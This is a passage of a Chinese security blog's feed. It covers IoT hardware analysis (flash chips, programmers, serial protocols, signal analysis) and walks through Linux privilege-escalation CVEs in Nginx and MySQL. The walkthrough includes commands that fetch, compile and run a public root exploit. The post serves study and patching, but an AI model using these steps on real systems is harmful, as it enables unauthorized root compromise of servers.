NorFlash因为接口简单，使用的引脚少，易于连接，操作方便，并且可以在芯片上直接运行代码，其稳定性出色，传输速率高，在小容量时具有很高的性价比，这使其很适合应于嵌入式系统中作为 FLASH ROM，所以在市场的占用率非常高。<br>我们通常见到的S25FL128、MX25L1605、W25Q64等型号都是SPI NorFlash，其常见的封装多为SOP8，SOP16，WSON8，US0N8，QFN8、BGA24等。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image23.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image24.jpg" alt=""></p><h3 id="芯片印字"><a href="#芯片印字" class="headerlink" title="芯片印字"></a>芯片印字</h3><p> 一般PCB上有多块逻辑处理IC，在多个IC芯片中，可以通过分析电路原理和查找芯片印字来确定具体的存储芯片。<br> 芯片上的丝印大多数情况会注明厂商和芯片型号，通过印字可以初步确定芯片类型，同时丝印层的文字也可以帮助我们来确定存储的格式和大小，常见的W25芯片的印字含义如下：</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image25.jpg" alt=""></p><h2 id="编程器"><a href="#编程器" class="headerlink" title="编程器"></a>编程器</h2><p>读取Flash芯片，需要借助编程器，编程器又称烧录器、写入器、写码器，是专门用来对IC芯片进行读写、编程/烧录的仪器。并口多功能BIOS编程器，它可以对EPROM（27系列芯片）、EEPROM（28系列芯片）、FLASH ROM（29、39、49系列芯片）及单片机、串行芯片等进行读写、编程，是一种性价比较高的编程器。<br>编程器种类多样，从功能简单的专用型到功能全面的全功能通用型都有，价格从几十元到上万元不等。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image26.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image27.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image28.jpg" alt=""></p><h2 id="通信协议"><a href="#通信协议" class="headerlink" title="通信协议"></a>通信协议</h2><p>串口通信指串口按位（bit）发送和接收字节。尽管比按字节（byte）的并行通信慢，但是串口可以在使用一根线发送数据的同时用另一根线接收数据。在串口通信中，常用的协议包括RS-232、RS-422和RS-485。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image29.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image30.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image31.jpg" alt=""></p><h3 id="RS-232"><a href="#RS-232" class="headerlink" title="RS-232"></a>RS-232</h3><p>通信方式允许简单连接三线：Tx、Rx和地线。但是对于数据传输，双方必须对数据定时采用使用相同的波特率。</p><h3 id="RS-422"><a href="#RS-422" class="headerlink" title="RS-422"></a>RS-422</h3><p>RS-422标准全称是“平衡电压数字接口电路的电气特性”，在RS232后推出，使用TTL差动电平表示逻辑，就是两根的电压差表示逻辑，RS422定义为全双工的，所以最少要4根通信线（一般额外地多一根地线）。</p><h3 id="RS-485"><a href="#RS-485" class="headerlink" title="RS-485"></a>RS-485</h3><p> RS485是一个定义平衡数字多点系统中的驱动器和接收器的电气特性的标准，RS-485与RS-422的区别在于RS-485为半双工通信方式，RS-422为全双工方式。RS-422用两对平衡差分信号线分别用于发送和接收，所以采用RS-422接口通信时最少需要4根线。RS-485只用一对平衡差分信号线，不能同时发送和接收，最少只需两根连线。</p><h3 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h3><p> spi是串行外设接口（Serial Peripheral Interface）的缩写。SPI，是一种高速的，全双工，同步的通信总线，并且在芯片的管脚上只占用四根线，节约了芯片的管脚，同时为PCB的布局上节省空间，提供方便，正是出于这种简单易用的特性，如今越来越多的芯片集成了这种通信协议，比如AT91RM9200。</p><h3 id="I2C"><a href="#I2C" class="headerlink" title="I2C"></a>I2C</h3><p> I2C 即Inter-Integrated Circuit(集成电路总线），这种总线类型是由飞利浦半导体公司在八十年代初设计出来的一种简单、双向、二线制、同步串行总线，主要是用来连接整体电路(ICS) ，IIC是一种多向控制总线，也就是说多个芯片可以连接到同一总线结构下，同时每个芯片都可以作为实时数据传输的控制源。这种方式简化了信号传输总线接口。</p><h2 id="信号分析"><a href="#信号分析" class="headerlink" title="信号分析"></a>信号分析</h2><h3 id="示波器分析"><a href="#示波器分析" class="headerlink" title="示波器分析"></a>示波器分析</h3><p>示波器是一种用途十分广泛的电子测量仪器。它能把肉眼看不见的电信号变换成看得见的图像，便于人们研究各种电现象的变化过程。示波器利用狭窄的、由高速电子组成的电子束，打在涂有荧光物质的屏面上，就可产生细小的光点（这是传统的模拟示波器的工作原理）。在被测信号的作用下，电子束就好像一支笔的笔尖，可以在屏面上描绘出被测信号的瞬时值的变化曲线。利用示波器能观察各种不同信号幅度随时间变化的波形曲线，还可以用它测试各种不同的电量，如电压、电流、频率、相位差、调幅度等等。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/IMG_3237.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/IMG_3239.jpg" alt=""></p><p>通过分析电路结构，找到待测的引脚和信号源，分析其信号变化和具体的信号形式,得到模拟信号和经过外部AD转换信号的波形图。</p><h3 id="逻辑分析仪"><a href="#逻辑分析仪" class="headerlink" title="逻辑分析仪"></a>逻辑分析仪</h3><p>逻辑分析仪是分析数字系统逻辑关系的仪器。逻辑分析仪是属于数据域测试[2]仪器中的一种总线分析仪，即以总线（多线）概念为基础，同时对多条数据线上的数据流进行观察和测试的仪器，这种仪器对复杂的数字系统的测试和分析十分有效。逻辑分析仪是利用时钟从测试设备上采集和显示数字信号的仪器，最主要作用在于时序判定。由于逻辑分析仪不像示波器那样有许多电压等级，通常只显示两个电压（逻辑1和0），因此设定了参考电压后，逻辑分析仪将被测信号通过比较器进行判定，高于参考电压者为High,低于参考电压者为Low，在High与 Low之间形成数字波形。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b34d5b3314fe.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b34d8d59bfb5.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b34d5c7b5319.jpg" alt=""></p><p>通过连接待测设备的接口，分析其中通信数据，通过协议转码，可以得到具体的16进制数据。</p><h2 id="设备拆解"><a href="#设备拆解" class="headerlink" title="设备拆解"></a>设备拆解</h2><p>对于一台未接触过的机器，拆解首先需要观察其外部结构，是否存在暴露的螺丝孔，如果没有，一般可能隐藏在贴纸或橡胶垫下面，可以用手感受是否存在空洞，部分机器采用卡榫结构，只要找对方向，用一字螺丝刀或撬片，从缝隙中就可以撬开，拆解设备唯一的要诀就是胆大心细。部分常用工具如下：</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image104.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b2d3ac1a60b9.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b2d3ac7644b8.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b2d3ad527734.jpg" alt=""></p><p>维修组合套装，用来拆装各类螺丝，PCB夹用来拔出排线，热风枪和焊台用来拆焊各类元器件和芯片，BGA焊台用于拆焊BGA封装的芯片。</p><h2 id="常见物联网智能设备"><a href="#常见物联网智能设备" class="headerlink" title="常见物联网智能设备"></a>常见物联网智能设备</h2><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image105.jpg" alt=""></p><p>共享充电宝，采用gprs模块配合物联卡与云端通信</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image106.jpg" alt=""></p><p>蓝牙挂锁，通过蓝牙芯片与手机配对通信，<br>蓝牙控制电机驱动，使卡锁运转</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image107.jpg" alt=""></p><p>共享充电宝，采用GSM模块加蓝牙模块控制通信</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image108.jpg" alt=""></p><p>智能锁，WIFI芯片加蓝牙芯片配合控制，外接指纹识别传感器</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image109.jpg" alt=""></p><p>智能摄像头，采用WIFI芯片通信，外接音频、视频处理模块</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image110.jpg" alt=""></p><p>网络摄像机，采用网卡芯片，配合多口输出输入视频信号模块</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image111.jpg" alt=""></p><p>智能路由器，高容量内存搭配智能OS</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image112.jpg" alt=""></p><p>智能家居控制终端，高性能WIFI收发中继控制</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image113.jpg" alt=""></p><p>智能保险柜，采用WIFI芯片控制加指纹识别传感器</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image114.jpg" alt=""></p><p>无线终端，采用4G模块和WIFI芯片，做便携式WIFI终端</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p> <a href="http://www.china-cic.cn/" target="_blank" rel="noopener">http://www.china-cic.cn/</a>  中国通信协会相关文献<br> <a href="https://www.eia.gov/" target="_blank" rel="noopener">https://www.eia.gov/</a>  美国电子工业协会相关标准</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;当我们在分析IOT设备，如智能摄像头、智能门锁、智能路由器等等产品时，采用传统的安全检测手段，如对APP的逆向、云端服务器的渗透测试、产品通
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="硬件分析" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Linux 应用权限不当可提权系统漏洞</title>
    <link href="http://yaseng.org/linux-file-permissions-security.html"/>
    <id>http://yaseng.org/linux-file-permissions-security.html</id>
    <published>2016-11-24T09:20:25.000Z</published>
    <updated>2018-05-08T12:44:23.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>linux以强大的文件管理系统著称，在实际使用中，虽然能为工作提供极大便利，然而如果权限处理不当，可能会造成一定的安全风险，如在操作文件时，会改变某些文件夹的权限，当利用一些可以随意穿越的符号链接时，可以使相应文件指向系统文件，越权修改系统文件权限，攻击者利用此原理，劫持so库，或修改启动定时脚本，从而提权。</p><a id="more"></a><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="Nginx-CVE-2016-1247"><a href="#Nginx-CVE-2016-1247" class="headerlink" title="Nginx  CVE-2016-1247"></a>Nginx  CVE-2016-1247</h3><p><strong>影响版本</strong><br>Debian*</p><p><strong>漏洞原理</strong><br>Debian* 默认apt-get 安装的nginx 会把日志目录的所有者设置为  www-data</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yaseng@ubuntu:/tmp$ ls  -ld  /var/<span class="built_in">log</span>/nginx/</span><br><span class="line">drwxr-x--- 2 www-data adm 4096 Nov 21 17:42 /var/<span class="built_in">log</span>/nginx/</span><br></pre></td></tr></table></figure><p>攻击者可以把目录下的日志文件修改为一个符号链接,指向一个没有权限写的文件,例如<br>/etc/ld.so.preload（共享库),当nginx 重启时会修改/etc/ld.so.preload<br>权限为 www-data ,这样就可以劫持环境提权到 root 。<br>nginx 有一个定时脚本(/etc/logrotate.d/nginx）每天 6:25 会重启 ,并且重新设置日志权限 ,只需写一个脚本监听 /etc/ld.so.preload 是否可写然后覆盖一个提权的 so 文件进去即可。<br><strong>漏洞测试</strong><br>环境: Ubuntu 15.04<br>exiloit : <a href="http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a><br>安装  sudo apt-get install nginx<br>提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">pwd</span></span><br><span class="line">/tmp</span><br><span class="line">www-data@ubuntu:/tmp$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@ubuntu:/tmp$ file  4.sh </span><br><span class="line">4.sh: Bourne-Again shell script, ASCII text executable</span><br><span class="line">www-data@ubuntu:/tmp$ ./4.sh  /var/<span class="built_in">log</span>/nginx/error.log</span><br></pre></td></tr></table></figure><p>等待nginx 重启,获取root权限<br><img src="/uploads/2016/11/14799665735069.jpg" alt="">￼</p><p><strong>漏洞修复</strong><br>修改日志权限为 root 。</p><h3 id="MySQL-CVE-2016-6663"><a href="#MySQL-CVE-2016-6663" class="headerlink" title="MySQL  CVE-2016-6663"></a>MySQL  CVE-2016-6663</h3><p><strong>影响版本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">MariaDB </span><br><span class="line">&lt; 5.5.52</span><br><span class="line">&lt; 10.1.18</span><br><span class="line">   &lt; 10.0.28</span><br><span class="line">MySQL  </span><br><span class="line">&lt;= 5.5.51</span><br><span class="line">&lt;= 5.6.32</span><br><span class="line">&lt;= 5.7.14</span><br><span class="line">Percona Server</span><br><span class="line">&lt; 5.5.51-38.2</span><br><span class="line">&lt; 5.6.32-78-1</span><br><span class="line">&lt; 5.7.14-8</span><br><span class="line">Percona XtraDB Cluster</span><br><span class="line">&lt; 5.6.32-25.17</span><br><span class="line">&lt; 5.7.14-26.17</span><br><span class="line">&lt; 5.5.41-37.0</span><br></pre></td></tr></table></figure><p><strong>漏洞原理</strong><br>MySQL以及其衍生版本在执行修复表( repair table  xxx)业务时会产生一个临时文件 xxx.TMD,赋予 xxx.TMD 一个 mysql  user 权限的SUID,由于MySQL的数据文件夹是可控的,如在赋予权限之前替换掉 TMD 文件(例如 /bin/bash/),就可以获得 mysql-suid 交互式shell 。从web 权限提升到  mysql  user。</p><p><strong>漏洞测试</strong><br>环境: Ubuntu 15.04  Mysql 5.6.28<br>exploit:<a href="http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c" target="_blank" rel="noopener">http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c</a></p><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yaseng@ubuntu:/tmp$ sudo apt-get install mysql-server mysql-client</span><br><span class="line">yaseng@ubuntu:/tmp$ sudo   service  mysqld  restart </span><br><span class="line">yaseng@ubuntu:/tmp$ wget http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c</span><br><span class="line">yaseng@ubuntu:/tmp$ gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient </span><br><span class="line">yaseng@ubuntu:/tmp$ ./mysql-privesc-race <span class="built_in">test</span> <span class="built_in">test</span> localhost <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>截图<br><img src="/uploads/2016/11/14799682334452.jpg" alt="">￼</p><p><strong>漏洞修复</strong><br><a href="https://github.com/mysql/mysql-server/commit/4e5473862e6852b0f3802b0cd0c6fa10b5253291" target="_blank" rel="noopener">https://github.com/mysql/mysql-server/commit/4e5473862e6852b0f3802b0cd0c6fa10b5253291</a></p><h3 id="MySQL-CVE-2016-6664"><a href="#MySQL-CVE-2016-6664" class="headerlink" title="MySQL  CVE-2016-6664"></a>MySQL  CVE-2016-6664</h3><p><strong>影响版本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MySQL  </span><br><span class="line">&lt;= 5.5.51</span><br><span class="line">&lt;= 5.6.32</span><br><span class="line">&lt;= 5.7.14</span><br><span class="line"></span><br><span class="line">MariaDB</span><br><span class="line">All current</span><br><span class="line"></span><br><span class="line">Percona Server</span><br><span class="line">&lt; 5.5.51-38.2</span><br><span class="line">&lt; 5.6.32-78-1</span><br><span class="line">&lt; 5.7.14-8</span><br><span class="line"></span><br><span class="line">Percona XtraDB Cluster</span><br><span class="line">&lt; 5.6.32-25.17</span><br><span class="line">&lt; 5.7.14-26.17</span><br><span class="line">&lt; 5.5.41-37.0</span><br></pre></td></tr></table></figure><p><strong>漏洞原理</strong><br>同 nginx 提权相似,MySQL 日志目录/var/log/mysql 权限为 mysql 。当以==mysqld_safe== 启动时。会执行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">--------[ mysqld_safe ]--------</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  rm -f <span class="string">"<span class="variable">$pid_file</span>"</span>     <span class="comment"># Some extra safety</span></span><br><span class="line"></span><br><span class="line">  start_time=`date +%M%S`</span><br><span class="line"></span><br><span class="line">  eval_log_error <span class="string">"<span class="variable">$cmd</span>"</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> [ <span class="variable">$want_syslog</span> -eq 0 -a ! -f <span class="string">"<span class="variable">$err_log</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">    touch <span class="string">"<span class="variable">$err_log</span>"</span>                    <span class="comment"># hypothetical: log was renamed but not</span></span><br><span class="line">    chown <span class="variable">$user</span> <span class="string">"<span class="variable">$err_log</span>"</span>              <span class="comment"># flushed yet. we'd recreate it with</span></span><br><span class="line">    chmod <span class="string">"<span class="variable">$fmode</span>"</span> <span class="string">"<span class="variable">$err_log</span>"</span>           <span class="comment"># wrong owner next time we log, so set</span></span><br><span class="line">  <span class="keyword">fi</span>                                    <span class="comment"># it up correctly while we can!</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">-------------------------------</span><br></pre></td></tr></table></figure><p>当利用CVE-2016-6663 获取到一个mysql  user ,可以直接kill mysqld 从而触发脚本，两个漏洞结合可以从webshell 直接提升到Linux root  。</p><p><strong>漏洞测试</strong><br>环境: Ubuntu 15.04  Mysql 5.6.28<br>exploit:<a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html</a></p><p>如图<br><img src="/uploads/2016/11/14799744830723.jpg" alt="">￼</p><p><strong>漏洞修复</strong><br>修改日志权限为 root 。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可以在源码和脚本中找chmod 关键词发现类似的漏洞,利用符号链接和 so 共享库劫持提权也值得学习。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a></li><li><a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html</a></li><li><a href="http://legalhackers.com/advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html</a></li><li><a href="http://xteam.baidu.com/?p=175" target="_blank" rel="noopener">http://xteam.baidu.com/?p=175</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;linux以强大的文件管理系统著称，在实际使用中，虽然能为工作提供极大便利，然而如果权限处理不当，可能会造成一定的安全风险，如在操作文件时，会改变某些文件夹的权限，当利用一些可以随意穿越的符号链接时，可以使相应文件指向系统文件，越权修改系统文件权限，攻击者利用此原理，劫持so库，或修改启动定时脚本，从而提权。&lt;/p&gt;
    
    </summary>
    
      <category term="技术文章" scheme="http://yaseng.org/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>网页弹幕插件 jquery.barrager.js hexo 集成</title>
    <link href="http://yaseng.org/jquery-barrager-js-for-hexo.html"/>
    <id>http://yaseng.org/jquery-barrager-js-for-hexo.html</id>
    <published>2016-04-24T22:44:09.000Z</published>
    <updated>2018-05-08T12:42:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>网页弹幕插件 jquery.barrager.js hexo 集成</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;网页弹幕插件 jquery.barrager.js hexo 集成&lt;/p&gt;

      
    
    </summary>
    
      <category term="Yaseng" scheme="http://yaseng.org/categories/Yaseng/"/>
    
    
      <category term="jquery.barrager.js" scheme="http://yaseng.org/tags/jquery-barrager-js/"/>
    
      <category term="网页弹幕" scheme="http://yaseng.org/tags/%E7%BD%91%E9%A1%B5%E5%BC%B9%E5%B9%95/"/>
    
      <category term="hexo 弹幕" scheme="http://yaseng.org/tags/hexo-%E5%BC%B9%E5%B9%95/"/>
    
      <category term="jQuery 弹幕插件" scheme="http://yaseng.org/tags/jQuery-%E5%BC%B9%E5%B9%95%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
</feed>
